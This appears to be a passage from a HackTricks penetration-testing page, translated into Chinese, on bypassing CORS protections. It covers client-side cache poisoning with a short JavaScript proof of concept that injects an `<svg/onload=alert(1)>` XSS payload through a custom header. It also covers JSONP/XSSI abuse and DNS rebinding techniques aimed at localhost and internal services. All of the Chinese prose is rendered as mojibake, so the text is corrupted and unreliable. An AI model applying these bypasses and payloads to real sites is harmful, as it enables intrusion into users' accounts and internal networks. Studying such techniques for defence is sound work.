**æ³¨æ„**ï¼šåˆ©ç”¨ HTTP å¤´æ³¨å…¥æ¼æ´ï¼Œç‰¹åˆ«æ˜¯é€šè¿‡æœåŠ¡å™¨ç«¯ç¼“å­˜ä¸­æ¯’ï¼Œå¼ºè°ƒäº†éªŒè¯å’Œæ¸…ç†æ‰€æœ‰ç”¨æˆ·æä¾›çš„è¾“å…¥ï¼ˆåŒ…æ‹¬ HTTP å¤´ï¼‰çš„é‡è¦æ€§ã€‚å§‹ç»ˆé‡‡ç”¨å¼ºå¤§çš„å®‰å…¨æ¨¡å‹ï¼ŒåŒ…æ‹¬è¾“å…¥éªŒè¯ï¼Œä»¥é˜²æ­¢æ­¤ç±»æ¼æ´ã€‚

### **å®¢æˆ·ç«¯ç¼“å­˜ä¸­æ¯’**

[**æ¥è‡ªè¿™é¡¹ç ”ç©¶**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè§‚å¯Ÿåˆ°ä¸€ä¸ªç½‘é¡µå®ä¾‹åæ˜ äº†æœªæ­£ç¡®ç¼–ç çš„è‡ªå®šä¹‰ HTTP å¤´çš„å†…å®¹ã€‚å…·ä½“è€Œè¨€ï¼Œç½‘é¡µåæ˜ äº†åŒ…å«åœ¨ `X-User-id` å¤´ä¸­çš„å†…å®¹ï¼Œè¿™å¯èƒ½åŒ…æ‹¬æ¶æ„ JavaScriptï¼Œå¦‚ç¤ºä¾‹æ‰€ç¤ºï¼Œå…¶ä¸­å¤´éƒ¨åŒ…å«ä¸€ä¸ª SVG å›¾åƒæ ‡ç­¾ï¼Œæ—¨åœ¨åœ¨åŠ è½½æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚

è·¨æºèµ„æºå…±äº« (CORS) ç­–ç•¥å…è®¸å‘é€è‡ªå®šä¹‰å¤´éƒ¨ã€‚ç„¶è€Œï¼Œç”±äº CORS é™åˆ¶ï¼Œå“åº”æœªè¢«æµè§ˆå™¨ç›´æ¥å‘ˆç°ï¼Œè¿™ç§æ³¨å…¥çš„å®ç”¨æ€§ä¼¼ä¹æœ‰é™ã€‚å…³é”®ç‚¹åœ¨äºè€ƒè™‘æµè§ˆå™¨çš„ç¼“å­˜è¡Œä¸ºã€‚å¦‚æœæœªæŒ‡å®š `Vary: Origin` å¤´ï¼Œåˆ™æ¶æ„å“åº”å¯èƒ½ä¼šè¢«æµè§ˆå™¨ç¼“å­˜ã€‚éšåï¼Œå½“å¯¼èˆªåˆ°è¯¥ URL æ—¶ï¼Œè¿™ä¸ªç¼“å­˜çš„å“åº”å¯èƒ½ä¼šè¢«ç›´æ¥å‘ˆç°ï¼Œç»•è¿‡åˆå§‹è¯·æ±‚æ—¶ç›´æ¥å‘ˆç°çš„éœ€è¦ã€‚æ­¤æœºåˆ¶é€šè¿‡åˆ©ç”¨å®¢æˆ·ç«¯ç¼“å­˜å¢å¼ºäº†æ”»å‡»çš„å¯é æ€§ã€‚

ä¸ºäº†è¯´æ˜æ­¤æ”»å‡»ï¼Œæä¾›äº†ä¸€ä¸ª JavaScript ç¤ºä¾‹ï¼Œæ—¨åœ¨åœ¨ç½‘é¡µç¯å¢ƒä¸­æ‰§è¡Œï¼Œä¾‹å¦‚é€šè¿‡ JSFiddleã€‚è¯¥è„šæœ¬æ‰§è¡Œä¸€ä¸ªç®€å•çš„æ“ä½œï¼šå®ƒå‘æŒ‡å®šçš„ URL å‘é€ä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript çš„è‡ªå®šä¹‰å¤´çš„è¯·æ±‚ã€‚åœ¨è¯·æ±‚æˆåŠŸå®Œæˆåï¼Œå®ƒå°è¯•å¯¼èˆªåˆ°ç›®æ ‡ URLï¼Œå¦‚æœå“åº”åœ¨æœªæ­£ç¡®å¤„ç† `Vary: Origin` å¤´çš„æƒ…å†µä¸‹è¢«ç¼“å­˜ï¼Œå¯èƒ½ä¼šè§¦å‘æ³¨å…¥è„šæœ¬çš„æ‰§è¡Œã€‚

ä»¥ä¸‹æ˜¯ç”¨äºæ‰§è¡Œæ­¤æ”»å‡»çš„ JavaScript çš„ç®€è¦åˆ†è§£ï¼š
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSIï¼Œä¹Ÿç§°ä¸ºè·¨ç«™è„šæœ¬åŒ…å«ï¼Œæ˜¯ä¸€ç§åˆ©ç”¨åŒæºç­–ç•¥ï¼ˆSOPï¼‰åœ¨ä½¿ç”¨è„šæœ¬æ ‡ç­¾åŒ…å«èµ„æºæ—¶ä¸é€‚ç”¨çš„æ¼æ´ã€‚è¿™æ˜¯å› ä¸ºè„šæœ¬éœ€è¦èƒ½å¤Ÿä»ä¸åŒåŸŸä¸­åŒ…å«ã€‚æ­¤æ¼æ´å…è®¸æ”»å‡»è€…è®¿é—®å’Œè¯»å–ä»»ä½•ä½¿ç”¨è„šæœ¬æ ‡ç­¾åŒ…å«çš„å†…å®¹ã€‚

å½“æ¶‰åŠåŠ¨æ€JavaScriptæˆ–JSONPï¼ˆå¸¦å¡«å……çš„JSONï¼‰æ—¶ï¼Œè¿™ä¸ªæ¼æ´å°¤å…¶é‡è¦ï¼Œç‰¹åˆ«æ˜¯å½“ä½¿ç”¨åƒcookiesè¿™æ ·çš„ç¯å¢ƒæƒé™ä¿¡æ¯è¿›è¡Œèº«ä»½éªŒè¯æ—¶ã€‚å½“ä»ä¸åŒä¸»æœºè¯·æ±‚èµ„æºæ—¶ï¼Œcookiesä¼šè¢«åŒ…å«ï¼Œä½¿æ”»å‡»è€…å¯ä»¥è®¿é—®ã€‚

ä¸ºäº†æ›´å¥½åœ°ç†è§£å’Œç¼“è§£æ­¤æ¼æ´ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å¯åœ¨[https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp)æ‰¾åˆ°çš„BurpSuiteæ’ä»¶ã€‚æ­¤æ’ä»¶å¯ä»¥å¸®åŠ©è¯†åˆ«å’Œè§£å†³æ‚¨Webåº”ç”¨ç¨‹åºä¸­çš„æ½œåœ¨XSSIæ¼æ´ã€‚

[**åœ¨è¿™é‡Œé˜…è¯»æœ‰å…³ä¸åŒç±»å‹çš„XSSIåŠå…¶åˆ©ç”¨æ–¹å¼çš„æ›´å¤šä¿¡æ¯ã€‚**](xssi-cross-site-script-inclusion.md)

å°è¯•åœ¨è¯·æ±‚ä¸­æ·»åŠ ä¸€ä¸ª**`callback`** **å‚æ•°**ã€‚ä¹Ÿè®¸é¡µé¢å‡†å¤‡å°†æ•°æ®ä½œä¸ºJSONPå‘é€ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé¡µé¢å°†ä»¥`Content-Type: application/javascript`è¿”å›æ•°æ®ï¼Œä»è€Œç»•è¿‡CORSç­–ç•¥ã€‚

![](<../.gitbook/assets/image (856).png>)

### ç®€å•ï¼ˆæ— ç”¨ï¼Ÿï¼‰ç»•è¿‡

ç»•è¿‡`Access-Control-Allow-Origin`é™åˆ¶çš„ä¸€ç§æ–¹æ³•æ˜¯è¯·æ±‚Webåº”ç”¨ç¨‹åºä»£è¡¨æ‚¨å‘å‡ºè¯·æ±‚å¹¶å‘é€å›å“åº”ã€‚ç„¶è€Œï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæœ€ç»ˆå—å®³è€…çš„å‡­æ®ä¸ä¼šè¢«å‘é€ï¼Œå› ä¸ºè¯·æ±‚æ˜¯å‘å¾€ä¸åŒçš„åŸŸã€‚

1. [**CORS-escape**](https://github.com/shalvah/cors-escape)ï¼šæ­¤å·¥å…·æä¾›ä¸€ä¸ªä»£ç†ï¼Œè½¬å‘æ‚¨çš„è¯·æ±‚åŠå…¶å¤´ï¼ŒåŒæ—¶ä¼ªé€ Originå¤´ä»¥åŒ¹é…è¯·æ±‚çš„åŸŸã€‚è¿™æœ‰æ•ˆåœ°ç»•è¿‡äº†CORSæ”¿ç­–ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨XMLHttpRequestçš„ç¤ºä¾‹ï¼š
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape)ï¼šæ­¤å·¥å…·æä¾›äº†ä¸€ç§æ›¿ä»£çš„è¯·æ±‚ä»£ç†æ–¹æ³•ã€‚æœåŠ¡å™¨ä¸æ˜¯ç›´æ¥ä¼ é€’æ‚¨çš„è¯·æ±‚ï¼Œè€Œæ˜¯ä½¿ç”¨æŒ‡å®šçš„å‚æ•°å‘å‡ºè‡ªå·±çš„è¯·æ±‚ã€‚

### Iframe + Popupç»•è¿‡

æ‚¨å¯ä»¥é€šè¿‡**åˆ›å»ºä¸€ä¸ªiframe**å¹¶**ä»ä¸­æ‰“å¼€ä¸€ä¸ªæ–°çª—å£**æ¥**ç»•è¿‡CORSæ£€æŸ¥**ï¼Œä¾‹å¦‚`e.origin === window.origin`ã€‚æ›´å¤šä¿¡æ¯è¯·å‚è§ä»¥ä¸‹é¡µé¢ï¼š

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### é€šè¿‡TTLè¿›è¡ŒDNSé‡ç»‘å®š

é€šè¿‡TTLè¿›è¡ŒDNSé‡ç»‘å®šæ˜¯ä¸€ç§é€šè¿‡æ“çºµDNSè®°å½•æ¥ç»•è¿‡æŸäº›å®‰å…¨æªæ–½çš„æŠ€æœ¯ã€‚å…¶å·¥ä½œåŸç†å¦‚ä¸‹ï¼š

1. æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªç½‘é¡µå¹¶ä½¿å—å®³è€…è®¿é—®å®ƒã€‚
2. æ”»å‡»è€…ç„¶åæ›´æ”¹å…¶è‡ªå·±åŸŸçš„DNSï¼ˆIPï¼‰ä»¥æŒ‡å‘å—å®³è€…çš„ç½‘é¡µã€‚
3. å—å®³è€…çš„æµè§ˆå™¨ç¼“å­˜DNSå“åº”ï¼Œå¯èƒ½å…·æœ‰TTLï¼ˆç”Ÿå­˜æ—¶é—´ï¼‰å€¼ï¼ŒæŒ‡ç¤ºDNSè®°å½•åº”è¢«è§†ä¸ºæœ‰æ•ˆçš„æ—¶é—´ã€‚
4. å½“TTLè¿‡æœŸæ—¶ï¼Œå—å®³è€…çš„æµè§ˆå™¨å‘å‡ºæ–°çš„DNSè¯·æ±‚ï¼Œå…è®¸æ”»å‡»è€…åœ¨å—å®³è€…çš„é¡µé¢ä¸Šæ‰§è¡ŒJavaScriptä»£ç ã€‚
5. é€šè¿‡ä¿æŒå¯¹å—å®³è€…IPçš„æ§åˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä¸å‘å—å®³è€…æœåŠ¡å™¨å‘é€ä»»ä½•cookiesçš„æƒ…å†µä¸‹æ”¶é›†å—å®³è€…çš„ä¿¡æ¯ã€‚

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæµè§ˆå™¨å…·æœ‰ç¼“å­˜æœºåˆ¶ï¼Œå¯èƒ½ä¼šé˜»æ­¢ç«‹å³æ»¥ç”¨æ­¤æŠ€æœ¯ï¼Œå³ä½¿TTLå€¼è¾ƒä½ã€‚

DNSé‡ç»‘å®šå¯¹äºç»•è¿‡å—å®³è€…æ‰§è¡Œçš„æ˜¾å¼IPæ£€æŸ¥æˆ–ç”¨æˆ·æˆ–æœºå™¨äººåœ¨åŒä¸€é¡µé¢ä¸Šåœç•™è¾ƒé•¿æ—¶é—´çš„åœºæ™¯éå¸¸æœ‰ç”¨ï¼Œä»è€Œå…è®¸ç¼“å­˜è¿‡æœŸã€‚

å¦‚æœæ‚¨éœ€è¦å¿«é€Ÿæ»¥ç”¨DNSé‡ç»‘å®šï¼Œå¯ä»¥ä½¿ç”¨åƒ[https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html)è¿™æ ·çš„æœåŠ¡ã€‚

è¦è¿è¡Œè‡ªå·±çš„DNSé‡ç»‘å®šæœåŠ¡å™¨ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨åƒ**DNSrebinder**ï¼ˆ[https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)ï¼‰è¿™æ ·çš„å·¥å…·ã€‚è¿™æ¶‰åŠåˆ°æš´éœ²æ‚¨çš„æœ¬åœ°ç«¯å£53/udpï¼Œåˆ›å»ºä¸€ä¸ªæŒ‡å‘å®ƒçš„Aè®°å½•ï¼ˆä¾‹å¦‚ï¼Œns.example.comï¼‰ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæŒ‡å‘å…ˆå‰åˆ›å»ºçš„Aå­åŸŸçš„NSè®°å½•ï¼ˆä¾‹å¦‚ï¼Œns.example.comï¼‰ã€‚ns.example.comå­åŸŸçš„ä»»ä½•å­åŸŸå°†ç”±æ‚¨çš„ä¸»æœºè§£æã€‚

æ‚¨è¿˜å¯ä»¥è®¿é—®[http://rebind.it/singularity.html](http://rebind.it/singularity.html)ä¸Šçš„å…¬å…±è¿è¡ŒæœåŠ¡å™¨ä»¥è¿›ä¸€æ­¥ç†è§£å’Œå®éªŒã€‚

### é€šè¿‡**DNSç¼“å­˜æ´ªæ°´**è¿›è¡ŒDNSé‡ç»‘å®š

é€šè¿‡DNSç¼“å­˜æ´ªæ°´è¿›è¡ŒDNSé‡ç»‘å®šæ˜¯å¦ä¸€ç§ç”¨äºç»•è¿‡æµè§ˆå™¨ç¼“å­˜æœºåˆ¶å¹¶å¼ºåˆ¶ç¬¬äºŒä¸ªDNSè¯·æ±‚çš„æŠ€æœ¯ã€‚å…¶å·¥ä½œåŸç†å¦‚ä¸‹ï¼š

1. æœ€åˆï¼Œå½“å—å®³è€…å‘å‡ºDNSè¯·æ±‚æ—¶ï¼Œå“åº”ä¸ºæ”»å‡»è€…çš„IPåœ°å€ã€‚
2. ä¸ºäº†ç»•è¿‡ç¼“å­˜é˜²å¾¡ï¼Œæ”»å‡»è€…åˆ©ç”¨æœåŠ¡å·¥ä½œè€…ã€‚æœåŠ¡å·¥ä½œè€…æ´ªæ°´å¼åœ°å¡«å……DNSç¼“å­˜ï¼Œè¿™æœ‰æ•ˆåœ°åˆ é™¤äº†ç¼“å­˜çš„æ”»å‡»è€…æœåŠ¡å™¨åç§°ã€‚
3. å½“å—å®³è€…çš„æµè§ˆå™¨å‘å‡ºç¬¬äºŒä¸ªDNSè¯·æ±‚æ—¶ï¼Œç°åœ¨å“åº”ä¸ºIPåœ°å€127.0.0.1ï¼Œè¿™é€šå¸¸æŒ‡çš„æ˜¯æœ¬åœ°ä¸»æœºã€‚

é€šè¿‡ç”¨æœåŠ¡å·¥ä½œè€…å¡«å……DNSç¼“å­˜ï¼Œæ”»å‡»è€…å¯ä»¥æ“çºµDNSè§£æè¿‡ç¨‹å¹¶å¼ºåˆ¶å—å®³è€…çš„æµè§ˆå™¨å‘å‡ºç¬¬äºŒä¸ªè¯·æ±‚ï¼Œè¿™æ¬¡è§£æä¸ºæ”»å‡»è€…æ‰€éœ€çš„IPåœ°å€ã€‚

### é€šè¿‡**ç¼“å­˜**è¿›è¡ŒDNSé‡ç»‘å®š

ç»•è¿‡ç¼“å­˜é˜²å¾¡çš„å¦ä¸€ç§æ–¹æ³•æ˜¯ä¸ºDNSæä¾›å•†ä¸­çš„åŒä¸€å­åŸŸåˆ©ç”¨å¤šä¸ªIPåœ°å€ã€‚å…¶å·¥ä½œåŸç†å¦‚ä¸‹ï¼š

1. æ”»å‡»è€…åœ¨DNSæä¾›å•†ä¸­ä¸ºåŒä¸€å­åŸŸè®¾ç½®ä¸¤ä¸ªAè®°å½•ï¼ˆæˆ–ä¸€ä¸ªå…·æœ‰ä¸¤ä¸ªIPçš„å•ä¸ªAè®°å½•ï¼‰ã€‚
2. å½“æµè§ˆå™¨æ£€æŸ¥è¿™äº›è®°å½•æ—¶ï¼Œå®ƒæ¥æ”¶åˆ°ä¸¤ä¸ªIPåœ°å€ã€‚
3. å¦‚æœæµè§ˆå™¨å†³å®šé¦–å…ˆä½¿ç”¨æ”»å‡»è€…çš„IPåœ°å€ï¼Œæ”»å‡»è€…å¯ä»¥æä¾›ä¸€ä¸ªæœ‰æ•ˆè´Ÿè½½ï¼Œè¯¥æœ‰æ•ˆè´Ÿè½½å¯¹åŒä¸€åŸŸæ‰§è¡ŒHTTPè¯·æ±‚ã€‚
4. ç„¶è€Œï¼Œä¸€æ—¦æ”»å‡»è€…è·å¾—å—å®³è€…çš„IPåœ°å€ï¼Œä»–ä»¬å°±åœæ­¢å“åº”å—å®³è€…çš„æµè§ˆå™¨ã€‚
5. å—å®³è€…çš„æµè§ˆå™¨åœ¨æ„è¯†åˆ°è¯¥åŸŸæ— å“åº”åï¼Œè½¬è€Œä½¿ç”¨ç¬¬äºŒä¸ªç»™å®šçš„IPåœ°å€ã€‚
6. é€šè¿‡è®¿é—®ç¬¬äºŒä¸ªIPåœ°å€ï¼Œæµè§ˆå™¨ç»•è¿‡åŒæºç­–ç•¥ï¼ˆSOPï¼‰ï¼Œå…è®¸æ”»å‡»è€…æ»¥ç”¨è¿™ä¸€ç‚¹å¹¶æ”¶é›†å’Œå¤–æ³„ä¿¡æ¯ã€‚

æ­¤æŠ€æœ¯åˆ©ç”¨äº†æµè§ˆå™¨åœ¨ä¸ºåŸŸæä¾›å¤šä¸ªIPåœ°å€æ—¶çš„è¡Œä¸ºã€‚é€šè¿‡æˆ˜ç•¥æ€§åœ°æ§åˆ¶å“åº”å¹¶æ“çºµæµè§ˆå™¨çš„IPåœ°å€é€‰æ‹©ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨SOPå¹¶è®¿é—®å—å®³è€…çš„ä¿¡æ¯ã€‚

{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œä¸ºäº†è®¿é—®localhostï¼Œæ‚¨åº”è¯¥å°è¯•åœ¨Windowsä¸­é‡æ–°ç»‘å®š**127.0.0.1**ï¼Œåœ¨Linuxä¸­é‡æ–°ç»‘å®š**0.0.0.0**ã€‚\
åƒgodaddyæˆ–cloudflareè¿™æ ·çš„æä¾›å•†ä¸å…è®¸æˆ‘ä½¿ç”¨IP 0.0.0.0ï¼Œä½†AWS route53å…è®¸æˆ‘åˆ›å»ºä¸€ä¸ªå…·æœ‰ä¸¤ä¸ªIPçš„Aè®°å½•ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯"0.0.0.0"

<img src="../.gitbook/assets/image (140).png" alt="" data-size="original">
{% endhint %}

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹[https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)

### å…¶ä»–å¸¸è§ç»•è¿‡

* å¦‚æœ**ä¸å…è®¸å†…éƒ¨IP**ï¼Œä»–ä»¬å¯èƒ½**å¿˜è®°ç¦æ­¢0.0.0.0**ï¼ˆåœ¨Linuxå’ŒMacä¸Šæœ‰æ•ˆï¼‰
* å¦‚æœ**ä¸å…è®¸å†…éƒ¨IP**ï¼Œåˆ™å“åº”**CNAME**åˆ°**localhost**ï¼ˆåœ¨Linuxå’ŒMacä¸Šæœ‰æ•ˆï¼‰
* å¦‚æœ**ä¸å…è®¸å†…éƒ¨IP**ä½œä¸ºDNSå“åº”ï¼Œæ‚¨å¯ä»¥å“åº”**CNAMEåˆ°å†…éƒ¨æœåŠ¡**ï¼Œä¾‹å¦‚www.corporate.internalã€‚

### DNSé‡ç»‘å®šæ­¦å™¨åŒ–

æ‚¨å¯ä»¥åœ¨æ¼”è®²[Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ)ä¸­æ‰¾åˆ°æœ‰å…³å…ˆå‰ç»•è¿‡æŠ€æœ¯çš„æ›´å¤šä¿¡æ¯ä»¥åŠå¦‚ä½•ä½¿ç”¨ä»¥ä¸‹å·¥å…·ã€‚

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity)æ˜¯ä¸€ä¸ªæ‰§è¡Œ[DNSé‡ç»‘å®š](https://en.wikipedia.org/wiki/DNS\_rebinding)æ”»å‡»çš„å·¥å…·ã€‚å®ƒåŒ…æ‹¬å°†æ”»å‡»æœåŠ¡å™¨DNSåç§°çš„IPåœ°å€é‡æ–°ç»‘å®šåˆ°ç›®æ ‡æœºå™¨çš„IPåœ°å€å¹¶æä¾›æ”»å‡»æœ‰æ•ˆè´Ÿè½½ä»¥åˆ©ç”¨ç›®æ ‡æœºå™¨ä¸Šè„†å¼±è½¯ä»¶æ‰€éœ€çš„ç»„ä»¶ã€‚

### é’ˆå¯¹DNSé‡ç»‘å®šçš„çœŸæ­£ä¿æŠ¤

* åœ¨å†…éƒ¨æœåŠ¡ä¸­ä½¿ç”¨TLS
* è¯·æ±‚èº«ä»½éªŒè¯ä»¥è®¿é—®æ•°æ®
* éªŒè¯Hostå¤´
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/)ï¼šæè®®åœ¨å…¬å…±æœåŠ¡å™¨æƒ³è¦è®¿é—®å†…éƒ¨æœåŠ¡å™¨æ—¶å§‹ç»ˆå‘é€é¢„æ£€è¯·æ±‚

## **å·¥å…·**

**æ¨¡ç³Šå¯èƒ½çš„CORSæ”¿ç­–é…ç½®é”™è¯¯**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)
* [https://github.com/omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne)

## å‚è€ƒæ–‡çŒ®

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æ”»å‡»ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æ”»å‡»ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordå°ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥å°ç»„**](https://t.me/peass)æˆ–**åœ¨Twitterä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
